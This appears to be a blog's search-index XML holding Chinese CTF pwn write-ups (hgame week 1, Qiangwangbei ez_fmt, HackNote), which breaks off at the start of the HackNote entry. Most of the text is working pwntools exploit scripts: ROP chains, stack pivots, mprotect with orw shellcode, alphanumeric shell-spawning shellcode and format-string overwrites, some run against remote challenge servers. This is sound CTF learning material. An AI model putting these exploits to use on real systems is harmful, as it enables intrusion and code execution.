<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>hgame_week1_pwn题解</title>
      <link href="/posts/hgame_week1.html"/>
      <url>/posts/hgame_week1.html</url>
      
        <content type="html"><![CDATA[<h2 id="ezsignIn"><a href="#ezsignIn" class="headerlink" title="ezsignIn"></a>ezsignIn</h2><p>手速够快直接拿下一血</p><h2 id="elden-ring"><a href="#elden-ring" class="headerlink" title="elden ring"></a>elden ring</h2><p>黑屏加载难绷，思路大概这样，栈迁移到bss段，mprotect改bss段权限，然后bss段注入shellcode执行orw.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment">#p=process(&quot;./vuln&quot;)</span></span><br><span class="line">p=remote(<span class="string">&quot;47.100.137.175&quot;</span>,<span class="number">32546</span>)</span><br><span class="line">one=<span class="number">0xe3afe</span></span><br><span class="line">libc=ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">elf=context.binary=ELF(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line">sleep(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">pop_rdi=<span class="number">0x00000000004013e3</span></span><br><span class="line">main=<span class="number">0x401297</span></span><br><span class="line">vuln=<span class="number">0x40125B</span></span><br><span class="line">leave_ret=<span class="number">0x0000000000401290</span></span><br><span class="line">csu1=<span class="number">0x4013dc</span></span><br><span class="line">csu2=<span class="number">0x4013C0</span></span><br><span class="line">gadget=<span class="number">0x000000000002601a</span></span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x108</span>+p64(pop_rdi)+p64(elf.got[<span class="string">&quot;puts&quot;</span>])+p64(elf.plt[<span class="string">&quot;puts&quot;</span>])+p64(vuln)</span><br><span class="line">p.send(payload)</span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc_base=puts_addr-libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">pop_rsi=<span class="number">0x000000000002601f</span>+libc_base</span><br><span class="line">pop_rdx=<span class="number">0x0000000000142c92</span>+libc_base</span><br><span class="line">pop_rdi=<span class="number">0x0000000000023b6a</span>+libc_base</span><br><span class="line">mprotect=libc_base+libc.sym[<span class="string">&quot;mprotect&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#sleep(8)</span></span><br><span class="line">open_addr=libc_base+libc.sym[<span class="string">&quot;open&quot;</span>]</span><br><span class="line">read_addr=libc_base+libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">write_addr=libc_base+libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">bss=<span class="number">0x404000</span></span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x100</span>+p64(bss)+p64(pop_rsi)+p64(bss)+p64(read_addr)+p64(leave_ret)</span><br><span class="line">p.sendafter(<span class="string">&quot;Greetings. Traveller from beyond the fog. I Am Melina. I offer you an accord.\n&quot;</span>,payload)</span><br><span class="line"><span class="comment">#sleep(0.25)</span></span><br><span class="line">payload=<span class="string">b&quot;./flag\x00\x00&quot;</span></span><br><span class="line">payload+=flat([</span><br><span class="line">pop_rdi,bss,pop_rsi,<span class="number">0x1000</span>,pop_rdx,<span class="number">7</span>,mprotect,bss+<span class="number">0x50</span></span><br><span class="line">])</span><br><span class="line">payload.ljust(<span class="number">0x50</span>,asm(<span class="string">&quot;nop&quot;</span>))</span><br><span class="line">shellcode=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rdi,0x404000</span></span><br><span class="line"><span class="string">mov rax,2</span></span><br><span class="line"><span class="string">mov rsi,0</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi,3</span></span><br><span class="line"><span class="string">mov rsi,0x404200</span></span><br><span class="line"><span class="string">mov rax,0</span></span><br><span class="line"><span class="string">mov rdx,0x50</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi,1</span></span><br><span class="line"><span class="string">mov rsi,0x404200</span></span><br><span class="line"><span class="string">mov rax,1</span></span><br><span class="line"><span class="string">mov rdx,0x50</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode=asm(shellcode)</span><br><span class="line">payload+=shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>注意需要泄露libc基址。然后去调用mprotect</p><h2 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h2><p>搓了半天shellcode发现ae64里面有现成的，这里的shellcode需要满足的约束0&lt;&#x3D;v3&lt;&#x3D;9&amp;&amp;a&lt;&#x3D;v3&lt;&#x3D;z&amp;&amp;A&lt;&#x3D;v3&lt;&#x3D;Z,而ae64生成的shellcode里，满足rax寄存器这个约束的shellcode刚好也满足以上约束，所以直接用生成的就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"><span class="comment">#p=process(&quot;./vuln&quot;)</span></span><br><span class="line">p=remote(<span class="string">&quot;47.100.137.175&quot;</span>,<span class="number">31380</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#obj=AE64()</span></span><br><span class="line"><span class="comment">#sc=obj.encode(shellcraft.sh(),&quot;rax&quot;)</span></span><br><span class="line">shellcode = <span class="string">b&#x27;WTYH39Yj3TYfi9WmWZj8TYfi9JBWAXjKTYfi9kCWAYjCTYfi93iWAZjcTYfi9O60t800T810T850T860T870T8A0t8B0T8D0T8E0T8F0T8G0T8H0T8P0t8T0T8YRAPZ0t8J0T8M0T8N0t8Q0t8U0t8WZjUTYfi9860t800T850T8P0T8QRAPZ0t81ZjhHpzbinzzzsPHAghriTTI4qTTTT1vVj8nHTfVHAf1RjnXZP&#x27;</span></span><br><span class="line">lenth=<span class="built_in">len</span>(shellcode)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line">sleep(<span class="number">0.25</span>)</span><br><span class="line">p.send(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ezfmt-string"><a href="#ezfmt-string" class="headerlink" title="ezfmt_string"></a>ezfmt_string</h2><p>ez是你的谎言，其实可以给个libc文件 ，libc有时候会影响栈上布局，不给的话感觉不太严谨。我们先看看栈</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack <span class="number">0x28</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp <span class="number">0x7fffffffde70</span> ◂— <span class="string">&#x27;make strings and getshell\n&#x27;</span></span><br><span class="line">01:0008│     <span class="number">0x7fffffffde78</span> ◂— <span class="string">&#x27;ings and getshell\n&#x27;</span></span><br><span class="line">02:<span class="number">00</span>10│     <span class="number">0x7fffffffde80</span> ◂— <span class="string">&#x27; getshell\n&#x27;</span></span><br><span class="line">03:0018│     <span class="number">0x7fffffffde88</span> ◂— <span class="number">0x7ffff7000a6c</span> /* <span class="string">&#x27;l\n&#x27;</span> */</span><br><span class="line">04:0020│ r10 <span class="number">0x7fffffffde90</span> ◂— <span class="number">0xa343135343131</span> /* <span class="string">&#x27;114514\n&#x27;</span> */</span><br><span class="line">05:0028│     <span class="number">0x7fffffffde98</span> ◂— <span class="number">0x0</span></span><br><span class="line">06:0030│     <span class="number">0x7fffffffdea0</span> —▸ <span class="number">0x7ffff7e17600</span> (_IO_file_jumps) ◂— <span class="number">0x0</span></span><br><span class="line">07:0038│     <span class="number">0x7fffffffdea8</span> —▸ <span class="number">0x7ffff7c8a5ad</span> (_IO_file_setbuf+<span class="number">13</span>) ◂— test rax, rax</span><br><span class="line">08:0040│     <span class="number">0x7fffffffdeb0</span> —▸ <span class="number">0x7ffff7e1b780</span> (_IO_2_1_stdout_) ◂— <span class="number">0xfbad2887</span></span><br><span class="line">09:0048│     <span class="number">0x7fffffffdeb8</span> —▸ <span class="number">0x7ffff7c8157f</span> (setbuffer+<span class="number">191</span>) ◂— test dword ptr [rbx], <span class="number">0x8000</span></span><br><span class="line">0a:0050│     <span class="number">0x7fffffffdec0</span> ◂— <span class="number">0x6f0</span></span><br><span class="line">0b:0058│     <span class="number">0x7fffffffdec8</span> ◂— <span class="number">0x0</span></span><br><span class="line">0c:0060│     <span class="number">0x7fffffffded0</span> —▸ <span class="number">0x7fffffffdef0</span> —▸ <span class="number">0x7fffffffdf10</span> ◂— <span class="number">0x1</span></span><br><span class="line">0d:0068│     <span class="number">0x7fffffffded8</span> —▸ <span class="number">0x7fffffffe028</span> —▸ <span class="number">0x7fffffffe35f</span> ◂— <span class="number">0x306b2f656d6f682f</span> (<span class="string">&#x27;/home/k0&#x27;</span>)</span><br><span class="line">0e:0070│     <span class="number">0x7fffffffdee0</span> ◂— <span class="number">0x0</span></span><br><span class="line">0f:0078│     <span class="number">0x7fffffffdee8</span> ◂— <span class="number">0x176937f276af0d00</span></span><br><span class="line"><span class="number">10</span>:0080│ rbp <span class="number">0x7fffffffdef0</span> —▸ <span class="number">0x7fffffffdf10</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">11</span>:0088│     <span class="number">0x7fffffffdef8</span> —▸ <span class="number">0x401369</span> (main+<span class="number">60</span>) ◂— mov eax, <span class="number">0</span></span><br></pre></td></tr></table></figure><p>重点在<strong>0x7fffffffded0</strong>处的这个指针，他是指向rbp的，由于只能printf一次，泄露栈上地址不太现实，就只能利用栈上已有的指针。这个指针指向rbp，我们可以改rbp低位，利用两次leave ret实现栈迁移，迁移到哪呢，程序给了我们一个sys函数，我们把这个函数的地址写到栈上，然后尝试把rbp迁移到sys-0x8的位置，如果成功，两次leave ret后就可以返回到sys函数上，由于不确定栈上的地址，需要爆破。</p><h5 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"><span class="comment">#p=process(&quot;./vuln&quot;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">elf=ELF(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line">stack_chk=elf.got[<span class="string">&quot;__stack_chk_fail&quot;</span>]</span><br><span class="line">libc_start_main=elf.got[<span class="string">&quot;__libc_start_main&quot;</span>]</span><br><span class="line">system=<span class="number">0x0000000000401245</span></span><br><span class="line"><span class="comment">#payload=fmtstr_payload(10,&#123;stack_chk:system&#125;,write_size=&quot;short&quot;)+b&quot;%17$n&quot;+b&quot;a&quot;*0x13+b&quot;\x08&quot;</span></span><br><span class="line">payload=<span class="string">f&quot;%<span class="subst">&#123;<span class="number">0x70</span>&#125;</span>c%18$hhn&quot;</span>.encode()+<span class="string">b&quot;a&quot;</span>*<span class="number">0x4</span>+<span class="string">b&quot;a&quot;</span>*<span class="number">0x28</span>+p64(system)</span><br><span class="line"><span class="comment">#payload=f&quot;%&#123;system&amp;0xffff&#125;c%17$hnaaaa&quot;.encode()+b&quot;a&quot;*0x30+b&quot;\x18&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"><span class="comment">#p.send(payload)</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="comment">#p=process(&quot;./vuln&quot;)</span></span><br><span class="line">p=remote(<span class="string">&quot;47.100.137.175&quot;</span>,<span class="number">31102</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;@&quot;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">p.recv(timeout=<span class="number">1</span>)</span><br><span class="line"><span class="keyword">except</span> EOFError:</span><br><span class="line">p.close()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="comment">#print(hex(len(payload)))</span></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br></pre></td></tr></table></figure><h2 id="random"><a href="#random" class="headerlink" title="random"></a>random</h2><p>仔细看发现，read在srand之前，且有溢出，刚好能把seed改了，那我们直接把seed改成0,省点事，然后照着他的要求答题就行，用一个循环。最后分两次rop，一次泄露基址并返回到myread,一次ret2libc就可以了。<br>#####exp:</p><figure class="highlight plaintext"><figcaption><span>pwn import *</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import ctypes</span><br><span class="line">context(os=&quot;linux&quot;,arch=&quot;amd64&quot;)</span><br><span class="line">#p=process(&quot;./vuln&quot;)</span><br><span class="line">p=remote(&quot;47.100.139.115&quot;,30530)</span><br><span class="line">elf2=ELF(&quot;./vuln&quot;)</span><br><span class="line">elf=ctypes.cdll.LoadLibrary(&quot;./libc.so.6&quot;)</span><br><span class="line">elf.srand(0)</span><br><span class="line">payload=b&quot;a&quot;*10+p64(0)</span><br><span class="line">p.sendafter(&quot;name.&quot;,payload)</span><br><span class="line">for i in range(99):</span><br><span class="line">    payload=elf.rand()%100+1</span><br><span class="line">    p.sendafter(&quot;number:&quot;,p64(payload))</span><br><span class="line">s=p.recvuntil(&quot;mind.&quot;,timeout=10)</span><br><span class="line">print(s)  </span><br><span class="line">rdi=0x0000000000401423</span><br><span class="line">myread=0x401262</span><br><span class="line">payload=b&quot;a&quot;*0x38+p64(rdi)+p64(elf2.got[&quot;puts&quot;])+p64(elf2.plt[&quot;puts&quot;])+p64(myread)</span><br><span class="line">p.send(payload)</span><br><span class="line">puts_addr=u64(p.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))</span><br><span class="line">libc=ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">libc_base=puts_addr-libc.sym[&quot;puts&quot;]</span><br><span class="line">print(hex(libc_base))</span><br><span class="line">one=0xe3b04</span><br><span class="line">sleep(0.5)</span><br><span class="line">system=libc.sym[&quot;system&quot;]+libc_base</span><br><span class="line">bin_sh=libc_base+next(libc.search(b&quot;/bin/sh\x00&quot;))</span><br><span class="line">payload=b&quot;a&quot;*0x38+p64(rdi)+p64(bin_sh)+p64(system)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>强网杯ez_fmt复现</title>
      <link href="/posts/ez_fmt.html"/>
      <url>/posts/ez_fmt.html</url>
      
        <content type="html"><![CDATA[<h2 id="ez-fmt"><a href="#ez-fmt" class="headerlink" title="ez_fmt"></a>ez_fmt</h2><p>本来想着用格式化字符串低位爆破，不过看了别的师傅的文章，似乎有更为巧妙的思路。<br>先给大家看看题目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">nt __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char buf[88]; // [rsp+0h] [rbp-60h] BYREF</span><br><span class="line">  unsigned __int64 v5; // [rsp+58h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(0x28u);</span><br><span class="line">  setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(stdin, 0LL, 2, 0LL);</span><br><span class="line">  printf(&quot;There is a gift for you %p\n&quot;, buf);</span><br><span class="line">  read(0, buf, 0x30uLL);</span><br><span class="line">  if ( w == 0xFFFF )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(buf);</span><br><span class="line">    w = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目逻辑很简单，给了一个栈上的地址，然后有个只能利用一次的格式化字符串漏洞，这里如果想要在泄露libc基址，并同时劫持main的返回地址和w，0x30个字节显然是不够的，所以要另辟蹊径，尝试劫持<strong>子函数的返回地址</strong>，我们知道，在调用一个函数前,要先push rip，push rbp,把当前函数的执行状态和堆栈保留下来，而这里，题目把一个栈上的地址给我们，劫持子函数的返回地址是办得到的，gdb发现printf(buf)的返回地址刚好就在rsp上方，也就是rsp-8的位置，那我们就可以通过格式化字符串修改这个返回地址，从而控制整个程序。</p><h2 id="执行到printf-buf-时的栈"><a href="#执行到printf-buf-时的栈" class="headerlink" title="执行到printf(buf)时的栈"></a>执行到printf(buf)时的栈</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ rsp     0x7fffe5c1e828 —▸ 0x40123e (main+168) ◂— mov dword ptr [rip + 0x2dc8], 0</span><br><span class="line">01:0008│ rdi rsi 0x7fffe5c1e830 ◂— 0x2438256336303225 (&#x27;%206c%8$&#x27;)</span><br><span class="line">02:0010│         0x7fffe5c1e838 ◂— 0x70243931256e6868 (&#x27;hhn%19$p&#x27;)</span><br><span class="line">03:0018│         0x7fffe5c1e840 —▸ 0x7fffe5c1e828 —▸ 0x40123e (main+168) ◂— mov dword ptr [rip + 0x2dc8], 0</span><br><span class="line">04:0020│         0x7fffe5c1e848 —▸ 0x401205 (main+111) ◂— lea rax, [rbp - 0x60]</span><br><span class="line">05:0028│         0x7fffe5c1e850 —▸ 0x7f71461015e0 ◂— endbr64 </span><br><span class="line">06:0030│         0x7fffe5c1e858 —▸ 0x4012bd (<span class="strong">__libc<span class="emphasis">_csu_</span>init+77) ◂— add rbx, 1</span></span><br><span class="line"><span class="strong">07:0038│         0x7fffe5c1e860 —▸ 0x7f71460fc2e8 ◂— 0x0</span></span><br><span class="line"><span class="strong">08:0040│         0x7fffe5c1e868 —▸ 0x401270 (__</span>libc<span class="emphasis">_csu_</span>init) ◂— endbr64 </span><br><span class="line">09:0048│         0x7fffe5c1e870 ◂— 0x0</span><br><span class="line">0a:0050│         0x7fffe5c1e878 —▸ 0x4010b0 (<span class="emphasis">_start) ◂— endbr64 </span></span><br><span class="line"><span class="emphasis">0b:0058│         0x7fffe5c1e880 —▸ 0x7fffe5c1e980 ◂— 0x1</span></span><br><span class="line"><span class="emphasis">0c:0060│         0x7fffe5c1e888 ◂— 0xf4bc6e9f9994b300</span></span><br><span class="line"><span class="emphasis">0d:0068│ rbp     0x7fffe5c1e890 ◂— 0x0</span></span><br><span class="line"><span class="emphasis">0e:0070│         0x7fffe5c1e898 —▸ 0x7f7145f2f083 (<span class="strong">__libc_start_main+243) ◂— mov edi, eax</span></span></span><br></pre></td></tr></table></figure><p>我们可以看到此时push了一个返回地址上去，<del>0x40123e</del>,这就是我们要劫持的返回地址了，当然，劫持一个可能还不够，为了实现rop，我们至少需要写0x18个字节进去，但这里buf有长度限制，仅用格式化字符串显然是不够的。显然需要换一种思路。我们知道,ret相当于pop rip,那也就是说只需要把rsp控制到我们写入的位置就可以了，这里为了避免格式化字符串和我们写入的返回地址冲突，我们用<del>libc_csu_init</del>中的gadget来控制rsp。需要注意的是，在rop之前我们需要先泄露一个libc函数的地址来拿到libc_base。这一步可以放到格式化字符串那一步做。csu的pop执行完后，我们就可以利用ret来继续劫持程序流。<br><strong>所以我们的总体思路就是</strong>:<del>格式化字符串劫持子函数的返回地址到libc_csu_init</del>-&gt;<del>利用其中的pop|ret劫持程序流到read</del>-&gt;<del>利用read写入rop链，同时劫持read函数的返回地址</del></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line">p=process(<span class="string">&quot;./ez_fmt&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">buf_addr=<span class="string">&quot;0x&quot;</span>+p.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>].decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">buf_addr=<span class="built_in">int</span>(buf_addr,<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(buf_addr))</span><br><span class="line">read_addr=<span class="number">0x401205</span></span><br><span class="line">offset=<span class="number">0x18</span></span><br><span class="line">payload=<span class="string">b&quot;%206c%8$hhn%19$p&quot;</span>+p64(buf_addr-<span class="number">8</span>)+p64(read_addr)</span><br><span class="line">payload.ljust(<span class="number">0x30</span>,<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(<span class="string">&quot;0x&quot;</span>+p.recv(<span class="number">12</span>).decode(<span class="string">&quot;utf-8&quot;</span>),<span class="number">16</span>)-libc.sym[<span class="string">&quot;__libc_start_main&quot;</span>]-<span class="number">243</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">pop_rdi=<span class="number">0x00000000004012d3</span></span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_sh=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line">one=<span class="number">0xe3b04</span></span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x18</span>+p64(pop_rdi)+p64(bin_sh)+p64(libc_base+<span class="number">0x051CD2</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">#payload=b&quot;a&quot;*0x18+p64(one)</span></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bin_sh))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><strong>参考文献</strong>:<a href="https://www.cnblogs.com/S1nyer/p/17914751.html">https://www.cnblogs.com/S1nyer/p/17914751.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> -子函数劫持 -格式化字符串 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackNote</title>
      <link href="/posts/HackNote.html"/>
      <url>/posts/HackNote.html</url>
      
        <content type="html"><![CDATA[<h2 id="Hacknote"><a href="#Hacknote" class="headerlink" title="Hacknote"></a>Hacknote</h2><p>对于入门堆的师傅来说，这是个不错的入门题，但pwnabletw上扣了符号表，gdb调试起来比较麻烦，建议先做攻防世界上的，我们先看看ida反编译出来的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">void __cdecl __noreturn main()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; // eax</span><br><span class="line">  char buf[4]; // [esp+8h] [ebp-10h] BYREF</span><br><span class="line">  unsigned int v2; // [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(0x14u);</span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(stdin, 0, 2, 0);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  